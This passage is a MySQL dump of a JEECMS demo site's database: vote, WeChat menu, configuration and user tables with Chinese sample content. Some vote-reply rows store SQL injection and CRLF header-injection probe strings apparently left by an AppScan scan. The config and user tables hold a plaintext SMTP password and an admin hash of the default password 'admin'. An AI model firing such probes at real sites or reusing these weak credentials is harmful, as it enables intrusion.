INSERT INTO `jc_vote_reply` VALUES (113, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (114, '1234 or 7659=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (115, '&＃39;   &＃39;   &＃39;1234', 14);
INSERT INTO `jc_vote_reply` VALUES (116, '1234/**/and/**/0=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (117, '12345 12345 1234', 14);
INSERT INTO `jc_vote_reply` VALUES (118, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (119, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (120, '1234&＃39;   &＃39;   &＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (121, '1234/**/or/**/7659=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (122, '1234 and 7659=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (123, '12345-1234-1234', 14);
INSERT INTO `jc_vote_reply` VALUES (124, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (125, '&＃40;select 1234&＃41;', 14);
INSERT INTO `jc_vote_reply` VALUES (126, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (127, '&＃39; || &＃39;&＃39; || &＃39;1234', 14);
INSERT INTO `jc_vote_reply` VALUES (128, '1234 and abc=7659', 14);
INSERT INTO `jc_vote_reply` VALUES (129, '&＃40;select 1234,1234&＃41;', 14);
INSERT INTO `jc_vote_reply` VALUES (130, '&＃39; || &＃39; || &＃39;1234', 14);
INSERT INTO `jc_vote_reply` VALUES (131, '&＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (132, '1234 or', 14);
INSERT INTO `jc_vote_reply` VALUES (133, '1234&＃39; || &＃39; || &＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (134, '&＃40;select 1234,', 14);
INSERT INTO `jc_vote_reply` VALUES (135, 'AVAK$&＃40;RETURN_CODE&＃41;OS', 14);
INSERT INTO `jc_vote_reply` VALUES (136, '\\&＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (137, ';', 14);
INSERT INTO `jc_vote_reply` VALUES (138, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (139, '\"', 14);
INSERT INTO `jc_vote_reply` VALUES (140, '1234', 14);
INSERT INTO `jc_vote_reply` VALUES (141, '1234XYZ', 14);
INSERT INTO `jc_vote_reply` VALUES (142, '\\\"', 14);
INSERT INTO `jc_vote_reply` VALUES (143, '1234kqprobebg000043', 14);
INSERT INTO `jc_vote_reply` VALUES (144, '1234\rAppScanHeader: AppScanValue/1.2-1350\rSecondAppScanHeader: whatever', 14);
INSERT INTO `jc_vote_reply` VALUES (145, '&＃41;', 14);
INSERT INTO `jc_vote_reply` VALUES (146, 'kqprobebg000043', 14);
INSERT INTO `jc_vote_reply` VALUES (147, '1234\r\nAppScanHeader: AppScanValue/1.2-1355\r\nSecondAppScanHeader: whatever', 14);
INSERT INTO `jc_vote_reply` VALUES (148, '\"&＃39;', 14);
INSERT INTO `jc_vote_reply` VALUES (149, '1234&＃39;Akqprobebg000043', 14);
INSERT INTO `jc_vote_reply` VALUES (150, '1234\"Akqprobebg000043', 14);

-- ----------------------------
-- Table structure for jc_vote_subtopic
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_subtopic`;
CREATE TABLE `jc_vote_subtopic`  (
  `subtopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '标题',
  `votetopic_id` int(11) NOT NULL DEFAULT 0 COMMENT '投票（调查）',
  `subtopic_type` int(2) NOT NULL DEFAULT 1 COMMENT '类型（1单选，2多选，3文本）',
  `priority` int(11) NULL DEFAULT NULL,
  PRIMARY KEY (`subtopic_id`) USING BTREE,
  INDEX `FK_jc_vote_subtopic_vote`(`votetopic_id`) USING BTREE,
  CONSTRAINT `FK_jc_vote_subtopic_vote` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 28 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '投票子题目' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_vote_subtopic
-- ----------------------------
INSERT INTO `jc_vote_subtopic` VALUES (13, 'V8版本演示站网页的设计风格您喜欢吗？', 2, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (14, '我觉得这里完善一下：', 2, 3, 3);
INSERT INTO `jc_vote_subtopic` VALUES (15, 'V8版本比V7版的设计风格有改进吗？', 2, 1, 2);
INSERT INTO `jc_vote_subtopic` VALUES (16, '您觉得V8演示站哪些模块做的比较好', 2, 2, 4);
INSERT INTO `jc_vote_subtopic` VALUES (18, '上海工资收入', 3, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (20, '你喜欢哪个', 4, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (21, '你支持哪个选手？', 5, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (22, '你支持哪个选手？', 6, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (23, '你支持哪个选手？', 7, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (24, '你支持哪个选手？', 8, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (25, '你支持哪个学校？', 9, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (26, '国庆长假结束,您尽兴了吗?', 10, 1, 1);
INSERT INTO `jc_vote_subtopic` VALUES (27, '你对取消住房公积金怎么看？', 11, 1, 1);

-- ----------------------------
-- Table structure for jc_vote_topic
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_topic`;
CREATE TABLE `jc_vote_topic`  (
  `votetopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '标题',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `start_time` datetime NULL DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime NULL DEFAULT NULL COMMENT '结束时间',
  `repeate_hour` int(11) NULL DEFAULT NULL COMMENT '重复投票限制时间，单位小时，为空不允许重复投票',
  `total_count` int(11) NOT NULL DEFAULT 0 COMMENT '总投票数',
  `multi_select` int(11) NOT NULL DEFAULT 1 COMMENT '最多可以选择几项',
  `is_restrict_member` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否限制会员',
  `is_restrict_ip` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否限制IP',
  `is_restrict_cookie` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否限制COOKIE',
  `is_disabled` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否默认主题',
  `limit_weixin` tinyint(1) NULL DEFAULT 0 COMMENT '是否限制微信',
  `vote_day` int(11) NULL DEFAULT 0 COMMENT '限定微信投票每个用户每日投票次数,为0时则投票期内限定投票一次',
  PRIMARY KEY (`votetopic_id`) USING BTREE,
  INDEX `fk_jc_votetopic_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_votetopic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS投票主题' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_vote_topic
-- ----------------------------
INSERT INTO `jc_vote_topic` VALUES (2, 1, 'JEECMS演示站改版用户问卷调查', 'JEECMSv8版正式发布了，伴随着系统的完善，jeecms演示站的模板也一直在不断的改版，针对此次改版，jeecms美工团队特邀您参与“JEECMS演示站改版用户问卷调查”，希望大家能提出宝贵的意见，我们一定认真改进，谢谢大家的支持！', NULL, NULL, NULL, 84, 1, 0, 0, 0, 0, 1, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (3, 1, '工资收入问卷调查', '工资收入问卷调查', '2016-09-30 14:51:49', '2016-09-30 15:00:49', NULL, 1, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (4, 1, '男神女神主持选拔大赛', '男神女神主持选拔大赛开始了，美女帅哥云集，大家快来投票吧！', NULL, '2020-10-09 10:30:13', NULL, 0, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (5, 1, '最美志愿者评选', '', NULL, '2019-01-09 10:33:59', NULL, 0, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (6, 1, '2015年度好声音评选', '', NULL, '2016-12-31 10:35:16', NULL, 0, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (7, 1, '“樱花女神”评选大赛 第一季', '', NULL, '2017-10-18 10:36:42', NULL, 0, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (8, 1, '微信拍照大奖赛优秀作品 投票 开始啦', '', NULL, '2016-10-27 10:37:50', NULL, 0, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (9, 1, '南昌“我的校园我的家 温馨校园”评选活动', '', NULL, '2017-12-01 10:38:52', NULL, 0, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (10, 1, '国庆长假结束,您尽兴了吗?', '', NULL, '2017-10-10 10:40:41', NULL, 37, 1, 0, 0, 1, 0, 0, 0, 0);
INSERT INTO `jc_vote_topic` VALUES (11, 1, '专家建议取消住房公积金，这事儿你咋看？', '', NULL, '2018-10-18 10:42:29', NULL, 16, 1, 0, 0, 1, 0, 0, 0, 0);

-- ----------------------------
-- Table structure for jc_webservice
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice`;
CREATE TABLE `jc_webservice`  (
  `service_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_address` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '接口地址',
  `target_namespace` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `success_result` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '正确返回值',
  `service_type` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '接口类型',
  `service_operate` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '接口操作',
  PRIMARY KEY (`service_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '接口表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_webservice_auth
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_auth`;
CREATE TABLE `jc_webservice_auth`  (
  `auth_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码',
  `system` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '系统',
  `is_enable` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否启用',
  PRIMARY KEY (`auth_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'webservices认证表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_webservice_call_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_call_record`;
CREATE TABLE `jc_webservice_call_record`  (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_code` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '接口识别码',
  `auth_id` int(11) NOT NULL COMMENT '调用的认证',
  `record_time` datetime NOT NULL COMMENT '调用时间',
  PRIMARY KEY (`record_id`) USING BTREE,
  INDEX `fk_webservice_record_auth`(`auth_id`) USING BTREE,
  CONSTRAINT `fk_webservice_record_auth` FOREIGN KEY (`auth_id`) REFERENCES `jc_webservice_auth` (`auth_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '接口调用记录' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_webservice_param
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_param`;
CREATE TABLE `jc_webservice_param`  (
  `service_id` int(11) NOT NULL DEFAULT 0,
  `priority` int(11) NOT NULL DEFAULT 0 COMMENT '排列顺序',
  `param_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '参数名',
  `default_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '默认值',
  INDEX `fk_param_webservice`(`service_id`) USING BTREE,
  CONSTRAINT `fk_param_webservice` FOREIGN KEY (`service_id`) REFERENCES `jc_webservice` (`service_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '接口参数表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jg_weixin
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixin`;
CREATE TABLE `jg_weixin`  (
  `site_id` int(11) NOT NULL DEFAULT 0 COMMENT '站点ID',
  `wx_pic` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信二维码',
  `wx_welcome` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '关注欢迎语'
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jg_weixin
-- ----------------------------
INSERT INTO `jg_weixin` VALUES (1, '/u/cms/www/201510/08105041f9xd.jpg', '江西金磊科技有限公司欢迎您!');

-- ----------------------------
-- Table structure for jg_weixinmenu
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixinmenu`;
CREATE TABLE `jg_weixinmenu`  (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT 0 COMMENT '站点ID',
  `wm_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信菜单名称',
  `wm_type` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信菜单类别',
  `wm_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '链接地址',
  `wm_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '点击key',
  `wm_parent_id` int(11) NULL DEFAULT NULL COMMENT '父节点',
  PRIMARY KEY (`wm_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 15 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jg_weixinmenu
-- ----------------------------
INSERT INTO `jg_weixinmenu` VALUES (1, 1, '找官方', 'view', 'http://demo.jeecms.com/html/news/', '1', NULL);
INSERT INTO `jg_weixinmenu` VALUES (2, 1, '演示站', 'view', 'http://demo.jeecms.com/html/picture/', '2', NULL);
INSERT INTO `jg_weixinmenu` VALUES (3, 1, '新闻资讯', 'view', 'http://demo.jeecms.com/html/veido/', '3', NULL);
INSERT INTO `jg_weixinmenu` VALUES (4, 1, '论坛', 'view', 'http://bbs.jeecms.com', '4', 1);
INSERT INTO `jg_weixinmenu` VALUES (5, 1, '官网', 'view', 'http://www.jeecms.com/', '5', 1);
INSERT INTO `jg_weixinmenu` VALUES (6, 1, 'JSPGOU', 'view', 'http://demo3.jeecms.com', '6', 2);
INSERT INTO `jg_weixinmenu` VALUES (7, 1, 'JEEBBS', 'view', 'http://bbs.jeecms.com', '7', 2);
INSERT INTO `jg_weixinmenu` VALUES (8, 1, '图库', 'view', 'http://demo.jeecms.com/news/index.jhtml/pic/index.jhtml', '8', 3);
INSERT INTO `jg_weixinmenu` VALUES (9, 1, '新闻', 'click', '', 'news', 3);
INSERT INTO `jg_weixinmenu` VALUES (10, 1, 'JEECMS', 'view', 'http://demo.jeecms.com/', '', 2);
INSERT INTO `jg_weixinmenu` VALUES (11, 1, '视频', 'view', 'http://demo.jeecms.com/veido/index.jhtml', '', 3);
INSERT INTO `jg_weixinmenu` VALUES (12, 1, '下载', 'view', 'http://demo.jeecms.com/download/index.jhtml', 'http://demo19.jeecms.com/download/index.jhtml', 3);
INSERT INTO `jg_weixinmenu` VALUES (13, 1, '调查', 'view', 'http://demo.jeecms.com/survey.jhtml', 'http://demo19.jeecms.com/wldc/index.jhtml', 3);
INSERT INTO `jg_weixinmenu` VALUES (14, 1, 'JSPGOU店中店', 'view', 'http://dzd.jeecms.com/', 'http://dzd.jeecms.com/', 2);

-- ----------------------------
-- Table structure for jg_weixinmessage
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixinmessage`;
CREATE TABLE `jg_weixinmessage`  (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT 0 COMMENT '站点ID',
  `wm_number` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '序号',
  `wm_title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题',
  `wm_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '图片地址',
  `wm_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '链接地址',
  `wm_content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容',
  `is_welcome` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否欢迎页',
  `wm_msg_type` tinyint(1) NOT NULL DEFAULT 0 COMMENT '消息类型(0带图文链接 1内容加关键字提示 2仅有内容)',
  PRIMARY KEY (`wm_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jg_weixinmessage
-- ----------------------------
INSERT INTO `jg_weixinmessage` VALUES (1, 1, '', '留言', '/menhu/u/cms/www/201812/03150809gpeu.jpg', 'http://demo.jeecms.com/guestbook.jspx', '金磊科技欢迎您!', 1, 0);
INSERT INTO `jg_weixinmessage` VALUES (2, 1, 'news', '新闻', '/u/cms/www/201510/27142936gt6k.jpg', 'http://demo19.jeecms.com/news/index.jhtml', '新闻', 0, 0);

-- ----------------------------
-- Table structure for jo_authentication
-- ----------------------------
DROP TABLE IF EXISTS `jo_authentication`;
CREATE TABLE `jo_authentication`  (
  `authentication_id` char(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '认证ID',
  `userid` int(11) NOT NULL COMMENT '用户ID',
  `username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `email` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱',
  `login_time` datetime NOT NULL COMMENT '登录时间',
  `login_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '登录ip',
  `update_time` datetime NOT NULL COMMENT '更新时间',
  PRIMARY KEY (`authentication_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '认证信息表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jo_config
-- ----------------------------
DROP TABLE IF EXISTS `jo_config`;
CREATE TABLE `jo_config`  (
  `cfg_key` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '配置KEY',
  `cfg_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '配置VALUE',
  PRIMARY KEY (`cfg_key`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '配置表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jo_config
-- ----------------------------
INSERT INTO `jo_config` VALUES ('email_encoding', '');
INSERT INTO `jo_config` VALUES ('email_host', 'smtp.qq.com');
INSERT INTO `jo_config` VALUES ('email_password', '111111');
INSERT INTO `jo_config` VALUES ('email_personal', '');
INSERT INTO `jo_config` VALUES ('email_port', '465');
INSERT INTO `jo_config` VALUES ('email_username', '228375211@qq.com');
INSERT INTO `jo_config` VALUES ('login_error_interval', '30');
INSERT INTO `jo_config` VALUES ('login_error_times', '3');
INSERT INTO `jo_config` VALUES ('message_forgotpassword_subject', '找回JEECMS密码');
INSERT INTO `jo_config` VALUES ('message_forgotpassword_text', '感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost:8080/jeecmsv7/member/password_reset.jspx?uid=${uid}&key=${resetKey}');
INSERT INTO `jo_config` VALUES ('message_register_subject', '欢迎您注册JEECMS用户');
INSERT INTO `jo_config` VALUES ('message_register_text', '${username}您好：\r\n欢迎您注册JEECMS系统会员\r\n请点击以下链接进行激活\r\nhttp://localhost:8080/jeecmsv7/active.jspx?username=${username}&key=${activationCode}');
INSERT INTO `jo_config` VALUES ('message_subject', 'JEECMS会员密码找回信息');
INSERT INTO `jo_config` VALUES ('message_text', '感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost/member/password_reset.jspx?uid=${uid}&key=${resetKey}\r\n');

-- ----------------------------
-- Table structure for jo_ftp
-- ----------------------------
DROP TABLE IF EXISTS `jo_ftp`;
CREATE TABLE `jo_ftp`  (
  `ftp_id` int(11) NOT NULL AUTO_INCREMENT,
  `ftp_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'IP',
  `port` int(11) NOT NULL DEFAULT 21 COMMENT '端口号',
  `username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登录名',
  `password` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登陆密码',
  `encoding` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'UTF-8' COMMENT '编码',
  `timeout` int(11) NULL DEFAULT NULL COMMENT '超时时间',
  `ftp_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '路径',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '访问URL',
  PRIMARY KEY (`ftp_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'FTP表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jo_template
-- ----------------------------
DROP TABLE IF EXISTS `jo_template`;
CREATE TABLE `jo_template`  (
  `tpl_name` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '模板名称',
  `tpl_source` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '模板内容',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `is_directory` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否目录',
  PRIMARY KEY (`tpl_name`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '模板表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jo_upload
-- ----------------------------
DROP TABLE IF EXISTS `jo_upload`;
CREATE TABLE `jo_upload`  (
  `filename` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文件名',
  `length` int(11) NOT NULL COMMENT '文件大小(字节)',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `content` longblob NOT NULL COMMENT '内容',
  PRIMARY KEY (`filename`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '上传附件表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jo_user
-- ----------------------------
DROP TABLE IF EXISTS `jo_user`;
CREATE TABLE `jo_user`  (
  `user_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `email` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '电子邮箱',
  `password` char(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT 0 COMMENT '登录次数',
  `reset_key` char(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '重置密码KEY',
  `reset_pwd` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '重置密码VALUE',
  `error_time` datetime NULL DEFAULT NULL COMMENT '登录错误时间',
  `error_count` int(11) NOT NULL DEFAULT 0 COMMENT '登录错误次数',
  `error_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登录错误IP',
  `activation` tinyint(1) NOT NULL DEFAULT 1 COMMENT '激活状态',
  `activation_code` char(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '激活码',
  PRIMARY KEY (`user_id`) USING BTREE,
  UNIQUE INDEX `ak_username`(`username`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jo_user
-- ----------------------------
INSERT INTO `jo_user` VALUES (1, 'admin', 'aa@qq.com', '21232f297a57a5a743894a0e4a801fc3', '2011-01-03 00:00:00', '127.0.0.1', '2019-01-29 10:16:34', '127.0.0.1', 1717, NULL, NULL, NULL, 0, NULL, 1, NULL);
INSERT INTO `jo_user` VALUES (2, 'xlb123', '913971360@qq.com', '21232f297a57a5a743894a0e4a801fc3', '2018-11-22 14:41:05', '127.0.0.1', '2018-11-22 14:41:15', '127.0.0.1', 1, NULL, NULL, NULL, 0, NULL, 1, NULL);

-- ----------------------------
-- Table structure for menu_tree
-- ----------------------------
DROP TABLE IF EXISTS `menu_tree`;
CREATE TABLE `menu_tree`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `parent_id` int(11) NOT NULL,
  `menu_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `index_js` int(255) NULL DEFAULT NULL,
  `priority` int(100) NULL DEFAULT 1,
  `is_display` int(255) NULL DEFAULT 1,
  `menu_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `redirect` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `init_fun` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '',
  `menu_level` int(20) NULL DEFAULT NULL,
  `icon_cls` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `is_parent` int(2) NULL DEFAULT NULL,
  `is_leaf` int(2) NULL DEFAULT NULL,
  `custom_param` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '',
  `is_custom_page` int(3) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 36 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '0 父级菜单 1 中级别 2 底层级别' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of menu_tree
-- ----------------------------
INSERT INTO `menu_tree` VALUES (4, 0, '/menu', NULL, 1, 1, '菜单栏配置', '', '', 0, 'icon-yunying', NULL, 0, '', 0);
INSERT INTO `menu_tree` VALUES (14, 0, '/menTest', NULL, 3, 1, '测试父级菜单', '', 'init', 0, 'icon-file', 1, 0, '', 0);
INSERT INTO `menu_tree` VALUES (15, 14, '/baidu', 160, 6, 1, '测试连接百度', '', 'customMenuEdit', 2, '1', 1, 0, '{\"src\":\"https://www.baidu.com/\",\"setCollapse\":true}', 1);
INSERT INTO `menu_tree` VALUES (17, 4, '/menuTest/list', 160, 1, 1, '菜单栏配置', '', 'customMenuEdit', 2, '1', 1, 0, '{\"isBack\":true,\"src\":\"/menhu/jeeadmin/jeecms/spcp/menuEdit.html\"}', 1);
